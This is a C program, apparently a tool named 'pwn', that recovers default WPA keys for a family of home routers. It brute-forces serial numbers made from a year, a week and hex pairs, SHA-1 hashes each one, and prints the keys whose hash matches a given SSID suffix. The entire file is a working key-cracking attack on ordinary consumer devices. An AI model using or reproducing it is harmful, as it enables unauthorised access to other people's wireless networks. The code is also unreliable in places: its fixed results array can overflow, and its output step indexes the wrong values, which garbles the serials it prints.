# include <stdlib.h>
# include <stdio.h>
# include <string.h>

# include "sha1.h"

struct bbox {
  unsigned int year;
  unsigned int week;
  unsigned char h1;
  unsigned char h2;
  unsigned char h3;
  unsigned int ssid;
  unsigned char pass [5];
};

const unsigned char * hexvalues = "4142434445464748494A4B4C4D4E4F505152535455565758595A30313233343536373839";

unsigned char nibble(unsigned char x){
  /* it's a lowercase letter */
  if (x > 0x60) {return x - 0x57;}
  /* it's an uppercase letter */
  if (x > 0x40) {return x - 0x37;}
  /* it's a digit */
  return x - 0x30;
}

int main(int argc, char * argv[]) {
  struct bbox b;
  unsigned int h1;
  unsigned int h2;
  unsigned int h3;

  struct bbox results[10];
  unsigned int result_index = 0;

  unsigned char serial_number [13];
  
  unsigned char sha1_output_buffer[20];
  SHA1Context ctx;

  unsigned int i = 0;

  /* récupération du ssid depuis argv */
  if (argc != 2 || strlen(argv[1]) < 6) {
    puts("usage : ./pwn ssid[-6]");
    return 0;
  }

  /* ssid is little endian */ 
  b.ssid = 0;
  b.ssid += (nibble(argv[1][4]) << 4) + nibble(argv[1][5]);
  b.ssid <<= 8;
  b.ssid += (nibble(argv[1][2]) << 4) + nibble(argv[1][3]);
  b.ssid <<= 8;
  b.ssid += (nibble(argv[1][0]) << 4) + nibble(argv[1][1]);
  b.ssid <<= 8;

  
  serial_number[0] = 'C';
  serial_number[1] = 'P';
  serial_number[12] = 0x00;

  for (b.year = 2006; b.year < 2012; b.year++) {
    printf("Year %d\n",b.year);
    /* write year */
    serial_number[2] = 0x30 + (b.year % 100) / 10;
    serial_number[3] = 0x30 + (b.year % 10);

    for (b.week = 1; b.week < 52; b.week++) {
      /* write week */
      serial_number[4] = 0x30 + (b.week / 10);
      serial_number[5] = 0x30 + (b.week % 10);

      for (h1 = 0; h1 < 72; h1 += 2) {
        /* write hexvalue 1 */
        serial_number[6] = hexvalues[h1];
        serial_number[7] = hexvalues[h1 + 1];
        for (h2 = 0; h2 < 72; h2 += 2) {
          /* write hexvalue 2 */
          serial_number[8] = hexvalues[h2];
          serial_number[9] = hexvalues[h2+1];
          for (h3 = 0; h3 < 72; h3 += 2) {
            /* write hexvalue 3 */
            serial_number[10] = hexvalues[h3];
            serial_number[11] = hexvalues[h3+1];
            /* évaluation du sha1 */
            SHA1Reset(&ctx);
            SHA1Input(&ctx,serial_number,12);
            SHA1Result(&ctx,sha1_output_buffer);
            
            /* validation du ssid */
            sha1_output_buffer[16] = 0;
            if ((unsigned int)*((unsigned int *)&sha1_output_buffer[16]) == b.ssid) {
              /* win ! */

              results[result_index].year = b.year;
              results[result_index].week = b.week;
              results[result_index].h1 = hexvalues[h1];
              results[result_index].h2 = hexvalues[h2];
              results[result_index].h3 = hexvalues[h3];
              memcpy(&results[result_index].pass,&sha1_output_buffer,5);

              result_index++;
            }
          }
        }
      }
    }
  }

  /* bruteforce done : */
  printf("Got %d possibilities\n",result_index);
  printf("pass        serial\n");
  for (i=0;i<result_index;i++) {
    printf("%02X%02X%02X%02X%02X  CP%02d%02d%c%c%c%c%c%c\n",
      results[i].pass[0],
      results[i].pass[1],
      results[i].pass[2],
      results[i].pass[3],
      results[i].pass[4],
      results[i].year % 100,
      results[i].week,
      hexvalues[results[i].h1],
      hexvalues[results[i].h1+1],
      hexvalues[results[i].h2],
      hexvalues[results[i].h2+1],
      hexvalues[results[i].h3],
      hexvalues[results[i].h3+1]
      );
  }
}
